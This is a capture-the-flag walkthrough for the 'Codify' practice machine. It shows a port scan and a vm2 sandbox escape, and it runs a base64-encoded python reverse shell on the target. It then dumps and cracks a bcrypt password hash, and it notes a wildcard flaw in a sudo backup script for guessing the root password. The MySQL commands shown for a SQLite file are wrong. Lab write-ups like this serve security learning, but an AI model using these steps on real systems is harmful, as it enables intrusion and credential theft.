---
authors:
    - Jiri Raja
date: 08-10-2025
---
# Codify
Linux machine

## Foothold

Do not forget to update the `/etc/hosts` file.

### Nmap port scan

```shell
nmap -p- -sV -v 10.10.11.239
```

### Website enumeration and exploit
First, we go to about page, where we find the tool and version used.

We find the vs2 version vulnerable ([exploit](https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244)).

Get the [python reverse shells](https://github.com/infodox/python-pty-shells).  
Update the `tcp_backconnect.py` file with the desired port and address. Convert it into base64:
```shell
cat backconnect.py | base64 -w 0
```

Run the reverse shell on the target:
```shell
echo "<backconnect.py in base64>" | base64 -d | python3 -
```

## User
First, check the current user `whoami`. Enumerate `/var/www/`. 
An interesting file is `/var/www/contact/tickets.db` which is a SQLite DB. Open it using `sqlite3`:
```shell
sqlite3 tickets.db
```

Get hashed credentials from DB:
```shell
use mysql;
show tables;
SELECT * FROM users;
```

???+ info "Findins"

    The has is encrypted using `bcrypt`.
    ```text
    3|joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
    ```

### Crack the hash
Create hash.txt from the findings:

Use the `/usr/share/wordlists/rockyou.txt.gz` wordlist (`gzip -d rockyou.txt.gz`).  
Crack the hash:
```shell
hashcat -a 0 -m 3200 hash.txt rockyou.txt
```

???+ info "Findins"

    ```text
    spongebob1
    ```

Log in as the found credentials (`joshua:spongebob1`) using SSH.

## Root
Check for sudo privileges:
```shell
sudo -l
```

Check the script with sudo privileges:
```shell
cat /opt/scripts/mysql-backup.sh
```

There is an error in the script. Since the `$USER_PASS` is not in defined as string it allows regex matching (`*`), which we can use to start guessing the password letters one by one.